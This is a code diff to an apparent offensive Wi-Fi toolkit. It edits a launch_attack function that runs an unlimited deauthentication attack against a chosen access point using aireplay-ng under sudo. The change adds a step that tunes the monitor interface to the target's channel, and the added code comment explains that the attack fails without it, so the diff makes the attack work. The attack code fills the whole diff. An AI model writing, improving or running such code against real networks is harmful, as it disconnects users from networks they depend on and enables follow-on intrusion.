@@ -138,13 +138,20 @@ def select_target():
 def launch_attack(interface, target):
     banner.module_banner("wifi")
     banner.section("launching deauthentication attack", accent=banner.C.CYAN)
+    channel = target["channel"].strip()
+    bssid = target["BSSID"]
+    mon_interface = interface + "mon"
+
     print(f"  target essid  : {target['ESSID']}")
-    print(f"  target bssid  : {target['BSSID']}")
-    print(f"  channel       : {target['channel'].strip()}")
+    print(f"  target bssid  : {bssid}")
+    print(f"  channel       : {channel}")
     banner.countdown(3, "attacking")
 
-    subprocess.run(["airmon-ng", "start", "mon", interface])
-    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target["BSSID"], interface + "mon"])
+    # tune the monitor interface to the target's channel before deauthing,
+    # otherwise aireplay-ng listens on whatever channel it was last left on
+    # and never sees the target's beacon frames
+    subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel])
+    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface])
 
 
 def run():
